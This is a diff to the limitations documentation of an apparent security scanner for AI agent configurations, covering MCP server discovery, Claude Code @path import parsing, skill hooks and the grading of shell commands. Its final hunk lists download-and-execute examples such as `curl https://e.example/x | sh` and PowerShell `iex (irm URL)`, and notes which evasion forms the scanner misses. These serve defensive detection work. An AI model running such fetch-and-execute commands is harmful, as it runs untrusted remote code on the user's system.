@@ -893,7 +893,22 @@ A way around a limit that its entry does not describe is worth a
 - **Some directories are skipped.** Server source under directories named `build`,
   `dist`, `test`, `tests`, `docs`, `benchmarks` or `examples`, and `__tests__` for
   TypeScript and JavaScript, is skipped without a gap, and so are TypeScript
-  declaration files and scripts named like `server.test.mjs` or `server.spec.ts`.
+  declaration files and scripts named like `server.test.mjs` or `server.spec.ts`,
+  unless a configured server's `command` or `args` names the file. A file such a
+  server reaches some other way, such as through a wrapper script, a package entry
+  point, an absolute path, a `$VARIABLE` (`$PWD/`, `${workspaceFolder:name}/`), a
+  bare directory (`python3 examples`), combined short flags (`python3 -um x`) or a
+  name that differs only in case on a case-insensitive file system, stays skipped
+  without a gap. A launched path through an in-root directory link is reported as a
+  gap even when its target was read.
+- **A launched build output is read as written.** When `build/` or `dist/` is in
+  the scanned tree, whether checked in or built locally (the scanner does not read
+  `.gitignore`), a server launched from it is collected from the built file as well
+  as from its source, so the same tools can appear twice, and a bundle over the
+  `syntax-bytes` limit (256 KiB by default) is a scan failure. Raise the limit with
+  `--limit syntax-bytes=...`, or scan a tree without build output, such as a fresh
+  checkout. Of repeated `--directory` options, only the first and the last are
+  followed.
 - **Framework tools are collected by decorator only.** Module-level functions
   decorated with `@tool` (LangChain, CrewAI, smolagents), `@function_tool` (OpenAI
   Agents SDK) or PydanticAI's `@agent.tool` are collected by name; the descriptor is
@@ -1199,11 +1214,18 @@ A way around a limit that its entry does not describe is worth a
     also right after inline markup (`**@x.md**`, `_@x.md_`, the text of a link,
     a link, an escape such as `\#@x.md`, an escaped backtick, or raw
     HTML such as `<b>@x.md</b>`), even inside what CommonMark reads as one word.
+    The scanner reads one after white space, `>`, `)`, `]`, `[`, `*`, `_` or an
+    escaped punctuation character, which inline markup can end on, and after no other
+    character: Claude Code imports nothing from `(@x.md)`, `"@x.md"`, `x=@x.md` or
+    `https://unpkg.com/@x.md`, and imports `x.md` from `\@@x.md`.
   - The name ends where markup starts (`@x.md<br>` imports `x.md`) and at a
     backslash that escapes no space. `\ ` is a space, so `@my\ notes.md` imports
     `my notes.md`. A `#fragment` is dropped, so `@notes.md#rules` imports `notes.md`.
-    Trailing punctuation is kept, so `@notes.md.` imports `notes.md.` (the scanner
-    looks up both spellings).
+    Trailing punctuation is kept in the name, so Claude Code reads `notes.md.` from
+    `@notes.md.`, but it loads a file only when its suffix is empty or one of the text
+    suffixes it lists, so it skips `notes.md.` and `notes.md,` and loads `README)` from
+    `@README)`. The scanner looks up both spellings, so it can inventory a file such
+    as `notes.md.` that Claude Code does not load.
   - A list item's text is read raw, code spans included: ``- ` @notes.md ` ``
     imports `notes.md`, which GitHub shows as code. marked also keeps the lines after
     an item in it up to a blank line, and indented lines after that, where CommonMark
@@ -1214,22 +1236,50 @@ A way around a limit that its entry does not describe is worth a
     paragraph is text. The closing tags `</pre>`, `</script>`, `</style>` and
     `</textarea>`, and tags whose names only begin with those words, such as
     `<pretty>`, are text; `<meta>` opens an HTML block.
+  - An HTML block starts only where a space, a line end or `>` follows the tag name
+    and spaces alone separate its attributes, so after a tag with a tab or a no-break
+    space in it, such as `<div` and a tab before `class="team">`, the next line is
+    text and ``` `x`@notes.md ``` there imports `notes.md`. A tag name may hold an underscore, so
+    `<a_b>` opens a block. Only an unindented, lower-case block tag, `<script`, `<pre`,
+    `<style`, `<textarea` or `<!--` ends a paragraph, so an indented `<div>`, an
+    upper-case `<DIV>` or a `<!X` declaration after a paragraph is text. A processing instruction, declaration or
+    CDATA section ends right after it closes and the rest of its line is a new block
+    (``<?x?>`x`@notes.md`` imports `notes.md`); a `<pre>`, `<script>`, `<style>` or
+    `<textarea>` block ends only at its own closing tag; a block quote that holds an
+    HTML block continues on the next line without `>`; and a setext underline after
+    an HTML block that ended a paragraph makes both one heading.
 
   Where these readings may give a different block structure (a marked fence close,
   a tab before a fence, a fence or those HTML tags among lines marked keeps in a list
-  item), the raw text is retained as for other ambiguities, so a fenced example there
-  can count as an import. A name that only Claude Code's reading gives and that names
+  item, or an HTML block that marked starts or ends elsewhere, as above), the raw
+  text is retained as for other ambiguities, and a code span on each line may end
+  right before an import, so a fenced example there can count as an import. A code
+  span may also pair across the lines marked reads as one paragraph there, up to a
+  blank line or a bullet or `1.` item, so `<div` and a tab, then `` `a ``, then
+  ``b`@notes.md`` imports `notes.md`. A name that only Claude Code's reading gives and that names
   no file is skipped silently: it is looked up only by its exact spelling, so it
   raises no credential or case-variant gap, and a case variant of it on a
-  case-insensitive file system is not found. Each reference yields at most 16 names
-  cut at markup, so a name whose text token ends past its sixteenth markup character
-  is missed; a file with more than 2,000 places where such a reference can start is a
-  "too many @path imports" failure. In a seeded differential, the scanner missed 3
-  of 70,976 imports in 40,000 documents built from whole lines and 6 of 25,993 in
-  24,000 documents built from inline fragments. Each miss follows backticks that
-  marked pairs into code spans differently from CommonMark, such as `` `y`@x.md ``
-  after an unmatched run, or an HTML block that marked reads as the text of a block
-  quote above it. Other hosts' import readers have not been tested.
+  case-insensitive file system is not found. Such a name that leaves the project root
+  or is too long to look up is a gap, as Claude Code imports `../x.md` from
+  `**@../x.md**`; where marked may start a reference after markup but does not, as in
+  `a*@../x.md`, the gap is a false one and fails closed. An `@` inside a URL path, as
+  in `(https://unpkg.com/@../../x.md)`, starts no reference. A name is cut at each markup character
+  except a run of `_` between two letters or digits, where marked opens no emphasis,
+  so `**@a_b_c.md**` imports `a_b_c.md`; marked compares one UTF-16 unit there, so
+  after a letter outside the Basic Multilingual Plane, as in `@a𝐀_b`, the run is a cut. A file with more than 2,000 places where such
+  a reference can start, or whose references yield more than 32,000 names or more
+  than 4 Mi characters of them, as a run of thousands of `*` after an `@` does, is a
+  "too many @path imports" failure, and none of its imports is followed. In a seeded differential, the scanner missed 2
+  of 70,956 imports in 40,000 documents built from whole lines, 2 of 25,668 in
+  24,000 documents built from inline fragments, and 18 of 81,995 in 100,000
+  documents built around HTML block starts. Each miss follows backticks that marked
+  pairs into code spans differently from CommonMark, such as `` `y`@x.md `` after
+  raw HTML that may hold a backtick, or a list item or tab-indented line whose
+  blocks marked reads differently; one, `f4.md,`, is a name Claude Code reads but
+  does not load. Code spans that pair across block-quote lines and lazy lines after
+  a quoted HTML block, such as `> <div x=1>` with a span closing on a later `>`
+  line, are also missed in some arrangements. Other hosts' import readers have not
+  been tested.
 - **Files named as holding credentials are not read.** The `prompt` collector does not
   read a file without a Markdown suffix whose name says it holds credentials (`.env*`
   other than a template ending in `.example`, `.sample` or `.template`; `*.env` and
@@ -1269,7 +1319,13 @@ A way around a limit that its entry does not describe is worth a
   other.
 - **Skill front matter is not interpreted.** Every file in the skill and command
   directories, apart from files named as holding credentials, is bound by digest,
-  but settings such as `allowed-tools` are not read. A skill declaration (`.md`,
+  but settings such as `allowed-tools` are not read. Of skill front matter, only
+  `hooks` is read, by `ide_agents`, in `.claude/skills/*/SKILL.md`, as it is in
+  subagents' `.claude/agents/*.md`. `hooks` in the front matter of a command file (`.claude/commands/*.md`), of a
+  plugin's own skills, and under a subdirectory's `.claude` that holds no settings
+  file are not read; a plugin's subagents ignore hooks. `audit-control-plane` does
+  not list front-matter or plugin hook files as hook targets, and the `hooks` of a
+  plugin entry in `marketplace.json` are not followed to their files. A skill declaration (`.md`,
   `.mdc`, `.markdown`, `.txt`, `.yaml`, `.yml`, `.json`, `.toml`) above the
   `file-bytes` limit is a failure; a larger script or other resource is streamed and
   digested.
@@ -1414,7 +1470,28 @@ A way around a limit that its entry does not describe is worth a
   counts. That script is found only when `c` ends its option word and the script is
   the next word, and it is read as one command, so `bash -ce 'sh a'`,
   `bash -c -- 'sh a'`, `sh -c 'cat a | sh'` and a command line given to `env -S`
-  (`env -S 'sh a'`) are medium. A download unpacked and then run, as by
+  (`env -S 'sh a'`) are medium; for the same reason
+  `bash -c 'curl https://e.example/x | sh'` is high, not critical. Groups and
+  compound commands are found lexically, outside any quote-aware parse: the pipe is
+  passed into `{ ... }`, `( ... )` and `if`, `while`, `until`, `for` and `select`
+  bodies when the group opens a command after a pipe, but a `)` inside quotes can
+  end a `( ... )` group early (`curl x | ( echo ")"; sh )`), and a `case` body is not
+  split at its patterns (`curl x | case x in x) sh;; esac`). A descriptor that holds
+  the pipe through `N>&0`, or one named by a variable (`<&$fd`), is not followed, and
+  `eval $(cat -)` unquoted is split as two words, so those forms stay high. A variable
+  assigned a download or decode substitution counts as that substitution at every
+  reference, before or after the assignment and whatever is assigned to it in between,
+  so `x=$(curl x); x=ok; eval "$x"` is critical. A variable filled by `read`
+  (`read x < <(curl x); eval "$x"`), assigned inside another assignment's first word, or
+  assigned a substitution that does not start with the downloader or `base64`
+  (`x=$(echo y | base64 -d)`) is not followed, and only `echo`, `printf` and `cat` pass
+  one on to a pipe (`tee <<< "$x" | sh` is not read). A PowerShell grouped download
+  given to `iex` is matched as text where a command starts, after a separator, a group
+  or a quote, so `echo "iex (irm URL)"` is critical; a downloader object held in a variable
+  (`$wc = New-Object Net.WebClient; iex $wc.DownloadString(URL)`), a script block run
+  by `Invoke-Command -ScriptBlock`, and `irm URL | iex` inside a `-Command` string
+  (`pwsh -c "irm URL | iex"`) stay high. A download
+  unpacked and then run, as by
   `curl x | tar -xz; sh install.sh`, is medium, because the archive's members are not
   known. A file a downloader's `-o`
   wrote counts as run when it is any argument of a shell, `python` or `perl`, as it did
